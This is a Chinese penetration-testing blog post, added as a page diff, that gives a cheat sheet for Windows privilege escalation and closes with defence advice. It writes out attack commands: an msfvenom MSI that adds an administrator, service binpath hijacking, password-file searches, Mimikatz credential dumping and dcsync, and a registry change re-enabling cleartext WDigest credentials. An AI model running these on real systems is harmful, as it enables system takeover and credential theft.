@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lvyatan.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12,"width":280},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null,"show_result":true},"fold":{"enable":false,"height":500},"language":false,"border_radius":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="0x00 前言拿到 Windows 普通权限 shell 后，提权是后渗透关键。本文梳理 Windows 提权的常见路径与命令速查。仅用于授权环境。 0x01 基本信息收集1234567whoami &#x2F;all                       :: 当前用户、SID、特权hostnamever                               :: 系统版本systeminfo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows 提权思路整理">
+<meta property="og:url" content="https://lvyatan.github.io/2026/07/28/Windows%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/index.html">
+<meta property="og:site_name" content="网安学习笔记">
+<meta property="og:description" content="0x00 前言拿到 Windows 普通权限 shell 后，提权是后渗透关键。本文梳理 Windows 提权的常见路径与命令速查。仅用于授权环境。 0x01 基本信息收集1234567whoami &#x2F;all                       :: 当前用户、SID、特权hostnamever                               :: 系统版本systeminfo">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-28T07:45:00.000Z">
+<meta property="article:modified_time" content="2026-09-01T10:07:34.230Z">
+<meta property="article:author" content="lvyatan">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="后渗透">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://lvyatan.github.io/2026/07/28/Windows%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lvyatan.github.io/2026/07/28/Windows%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/","path":"2026/07/28/Windows提权思路整理/","title":"Windows 提权思路整理"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Windows 提权思路整理 | 网安学习笔记</title>
+  
+
+
+
+
+
+
+
+
+  
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">网安学习笔记</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">网络安全学习与渗透测试实践</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 基本信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">0x02 内核漏洞提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="nav-number">4.</span> <span class="nav-text">0x03 服务配置错误</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="nav-number">4.1.</span> <span class="nav-text">1. 不带引号的服务路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E5%AE%BD%E6%9D%BE"><span class="nav-number">4.2.</span> <span class="nav-text">2. 服务权限宽松</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-AlwaysInstallElevated"><span class="nav-number">4.3.</span> <span class="nav-text">3. AlwaysInstallElevated</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-DLL-%E5%8A%AB%E6%8C%81"><span class="nav-number">5.</span> <span class="nav-text">0x04 DLL 劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86"><span class="nav-number">6.</span> <span class="nav-text">0x05 凭据收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8C%E7%9A%84%E6%98%8E%E6%96%87-%E7%BC%93%E5%AD%98"><span class="nav-number">6.1.</span> <span class="nav-text">1. 注册表里的明文 &#x2F; 缓存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%AF%86%E9%92%A5"><span class="nav-number">6.2.</span> <span class="nav-text">2. 文件中的密钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81"><span class="nav-number">6.3.</span> <span class="nav-text">3. 浏览器密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Mimikatz%EF%BC%88%E9%BB%84%E9%87%91%E6%A0%87%E5%87%86%EF%BC%89"><span class="nav-number">6.4.</span> <span class="nav-text">4. Mimikatz（黄金标准）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="nav-number">7.</span> <span class="nav-text">0x06 令牌窃取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="nav-number">8.</span> <span class="nav-text">0x07 计划任务 &#x2F; 启动项</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7"><span class="nav-number">9.</span> <span class="nav-text">0x08 自动化枚举工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">10.</span> <span class="nav-text">0x09 防御建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-%E6%80%BB%E7%BB%93"><span class="nav-number">11.</span> <span class="nav-text">0x10 总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lvyatan"
+      src="https://avatars.githubusercontent.com/lvyatan">
+  <p class="site-author-name" itemprop="name">lvyatan</p>
+  <div class="site-description" itemprop="description">个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lvyatan" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lvyatan" rel="noopener me" target="_blank"><i class="fa fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2427719053@qq.com" title="E-Mail → mailto:2427719053@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/07/28/Windows%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Windows 提权思路整理 | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows 提权思路整理
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-07-28 15:45:00" itemprop="dateCreated datePublished" datetime="2026-07-28T15:45:00+08:00">2026-07-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 18:07:34" itemprop="dateModified" datetime="2026-09-01T18:07:34+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">后渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>911</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>拿到 Windows 普通权限 shell 后，提权是后渗透关键。本文梳理 Windows 提权的常见路径与命令速查。仅用于授权环境。</p>
+<h2 id="0x01-基本信息收集"><a href="#0x01-基本信息收集" class="headerlink" title="0x01 基本信息收集"></a>0x01 基本信息收集</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">whoami /all                       :: 当前用户、SID、特权</span><br><span class="line">hostname</span><br><span class="line"><span class="built_in">ver</span>                               :: 系统版本</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /B /C:&quot;OS&quot;   :: OS 详情</span><br><span class="line">wmic qfe list brief               :: 已安装补丁</span><br><span class="line"><span class="built_in">net</span> user</span><br><span class="line"><span class="built_in">net</span> localgroup Administrators</span><br></pre></td></tr></table></figure>
+
+<p><strong>重点</strong>：</p>
+<ul>
+<li><code>systeminfo</code> 看 OS 版本、补丁数、域 &#x2F; 工作组</li>
+<li><code>wmic qfe</code> 看缺哪些补丁 → 对照 CVE</li>
+<li><code>whoami /priv</code> 看当前用户特权</li>
+</ul>
+<h2 id="0x02-内核漏洞提权"><a href="#0x02-内核漏洞提权" class="headerlink" title="0x02 内核漏洞提权"></a>0x02 内核漏洞提权</h2><p>利用流程：</p>
+<ol>
+<li>拿 OS 版本与补丁列表</li>
+<li>上 <a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Watson">Watson</a> 或 <a target="_blank" rel="noopener" href="https://github.com/AonEmitSec/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>（基于 systeminfo 输出）</li>
+<li>对应 CVE 找现成 EXP</li>
+</ol>
+<p>经典 CVE：</p>
+<ul>
+<li><strong>MS16-032</strong>（CVE-2016-0099）：Win7&#x2F;2008 R2，提权到 SYSTEM</li>
+<li><strong>MS16-135</strong>（CVE-2016-7255）：Win10 早期版本</li>
+<li><strong>CVE-2021-1675 &#x2F; PrintNightmare</strong>：Print Spooler 漏洞，可加管理员</li>
+<li><strong>CVE-2022-26809</strong>：RPC 漏洞</li>
+</ul>
+<p>EXP 仓库：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">Windows-Kernel-Exploits</a></p>
+<h2 id="0x03-服务配置错误"><a href="#0x03-服务配置错误" class="headerlink" title="0x03 服务配置错误"></a>0x03 服务配置错误</h2><h3 id="1-不带引号的服务路径"><a href="#1-不带引号的服务路径" class="headerlink" title="1. 不带引号的服务路径"></a>1. 不带引号的服务路径</h3><p>服务可执行路径含空格且未加引号时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\My Service\service.exe</span><br></pre></td></tr></table></figure>
+
+<p>Windows 会依次尝试：</p>
+<ol>
+<li><code>C:\Program.exe</code></li>
+<li><code>C:\Program Files\My.exe</code></li>
+<li><code>C:\Program Files\My Service\service.exe</code></li>
+</ol>
+<p>如果普通用户能在 <code>C:\</code> 写 <code>Program.exe</code> → 服务启动时执行它。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | <span class="built_in">findstr</span> /i &quot;auto&quot; | <span class="built_in">findstr</span> /i /v &quot;c:\windows&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-服务权限宽松"><a href="#2-服务权限宽松" class="headerlink" title="2. 服务权限宽松"></a>2. 服务权限宽松</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查可写服务</span><br><span class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * -accepteula</span><br><span class="line"></span><br><span class="line"># 修改服务 BinarPath 为我们的 payload</span><br><span class="line">sc config &lt;servicename&gt; binpath= &quot;C:\shell.exe&quot;</span><br><span class="line">sc stop &lt;servicename&gt;</span><br><span class="line">sc <span class="built_in">start</span> &lt;servicename&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-AlwaysInstallElevated"><a href="#3-AlwaysInstallElevated" class="headerlink" title="3. AlwaysInstallElevated"></a>3. AlwaysInstallElevated</h3><p>注册表配置允许普通用户以 SYSTEM 权限安装 MSI：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+<p>返回 1（启用）时，生成 msi 提权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD=<span class="string">&#x27;net localgroup administrators user /add&#x27;</span> -f msi -o /tmp/pwn.msi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\pwn.msi</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-DLL-劫持"><a href="#0x04-DLL-劫持" class="headerlink" title="0x04 DLL 劫持"></a>0x04 DLL 劫持</h2><p>服务&#x2F;进程加载 DLL 顺序：</p>
+<ol>
+<li>应用所在目录</li>
+<li>System32</li>
+<li>System</li>
+<li>Windows</li>
+<li>当前工作目录</li>
+<li>PATH 变量</li>
+</ol>
+<p>如果应用目录可写，往里塞恶意 DLL 同名文件，启动时被加载。</p>
+<p>工具：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/sadshade/PowerUpDLLHijack">SioBaDoU工具</a></li>
+<li>Process Monitor 监控 <code>Name not found</code> 找缺失的 DLL</li>
+</ul>
+<h2 id="0x05-凭据收集"><a href="#0x05-凭据收集" class="headerlink" title="0x05 凭据收集"></a>0x05 凭据收集</h2><h3 id="1-注册表里的明文-缓存"><a href="#1-注册表里的明文-缓存" class="headerlink" title="1. 注册表里的明文 &#x2F; 缓存"></a>1. 注册表里的明文 &#x2F; 缓存</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\Software\SimonTatham\PuTTY\Sessions   :: PuTTY Session</span><br><span class="line">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WinLogon</span><br><span class="line">cmdkey /list                                          :: 凭据管理器</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-文件中的密钥"><a href="#2-文件中的密钥" class="headerlink" title="2. 文件中的密钥"></a>2. 文件中的密钥</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> /b /s C:\Users\*.txt | <span class="built_in">findstr</span> /i &quot;pass&quot;</span><br><span class="line"><span class="built_in">dir</span> /b /s C:\Users\*.docx | <span class="built_in">findstr</span> /i &quot;pass&quot;</span><br><span class="line"><span class="built_in">type</span> C:\Users\<span class="variable">%USERNAME%</span>\AppData\Roaming\MobaXterm\MobaXterm.ini</span><br><span class="line"><span class="built_in">type</span> <span class="variable">%APPDATA%</span>\VanDyke\Config\Sessions.ini</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-浏览器密码"><a href="#3-浏览器密码" class="headerlink" title="3. 浏览器密码"></a>3. 浏览器密码</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/djhohnstein/SharpChrome">SharpChrome</a>：解密 Chrome</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a>：综合密码抓取</li>
+</ul>
+<h3 id="4-Mimikatz（黄金标准）"><a href="#4-Mimikatz（黄金标准）" class="headerlink" title="4. Mimikatz（黄金标准）"></a>4. Mimikatz（黄金标准）</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonpasswords</span>   :: 抓明文 / <span class="title">NTLM</span> / <span class="title">Kerb</span></span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">sam</span>                :: <span class="title">SAM</span> 库</span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:lab</span>.<span class="title">local</span> /<span class="title">user:Administrator</span></span></span><br></pre></td></tr></table></figure>
+
+<p>需要管理员权限。Windows 10 后默认关闭了 wdigest 明文，可以打开：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest /v UseLogonCredential /t REG_DWORD /d <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>等用户重新登录即抓明文。</p>
+<h2 id="0x06-令牌窃取"><a href="#0x06-令牌窃取" class="headerlink" title="0x06 令牌窃取"></a>0x06 令牌窃取</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Incognito 模式（Meterpreter）</span><br><span class="line">load incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
+
+<p>服务账户（IIS &#x2F; SQL Server）常有 <code>SeImpersonatePrivilege</code> 特权，可利用 <a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">JuicyPotato</a>、<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a>、<a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a> 提权。</p>
+<h2 id="0x07-计划任务-启动项"><a href="#0x07-计划任务-启动项" class="headerlink" title="0x07 计划任务 &#x2F; 启动项"></a>0x07 计划任务 &#x2F; 启动项</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo list | <span class="built_in">findstr</span> /i &quot;taskname\|run&quot;</span><br><span class="line">:: 查找以 SYSTEM 运行 + 当前用户可写的脚本</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> C:\Users\<span class="variable">%USERNAME%</span>\AppData\Roaming\Microsoft\Windows\<span class="built_in">Start</span> Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x08-自动化枚举工具"><a href="#0x08-自动化枚举工具" class="headerlink" title="0x08 自动化枚举工具"></a>0x08 自动化枚举工具</h2><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>语言</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">WinPEAS</a></td>
+<td>C#</td>
+<td>全家桶，最常用</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">PowerUp</a></td>
+<td>PS</td>
+<td>PowerShell 经典</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></td>
+<td>C#</td>
+<td>输出干净</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Watson">Watson</a></td>
+<td>C#</td>
+<td>内核漏洞匹配</td>
+</tr>
+</tbody></table>
+<h2 id="0x09-防御建议"><a href="#0x09-防御建议" class="headerlink" title="0x09 防御建议"></a>0x09 防御建议</h2><ul>
+<li>及时打补丁，订阅 MSRC 公告</li>
+<li>最小权限原则：服务账户用 gMSA，不用 SYSTEM</li>
+<li>启用 LSA Protection（<code>RunAsPPL</code>）</li>
+<li>受限服务权限（<code>sc sdshow</code> 看 SDDL）</li>
+<li>Application Control + WDAC 拦截未授权 PE</li>
+<li>监控 <code>Mimikatz</code> 之类工具的进程创建</li>
+<li>Defender ATP 开 LSA 凭据保护</li>
+</ul>
+<h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>Windows 提权思路：<strong>配置错误 &gt; 内核漏洞 &gt; 凭据泄露</strong>。一份 <code>WinPEAS</code> + <code>systeminfo</code> 走天下，但理解原理才能在没工具时手动挖洞。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>lvyatan
+  </li>
+  <li class="post-copyright-link">
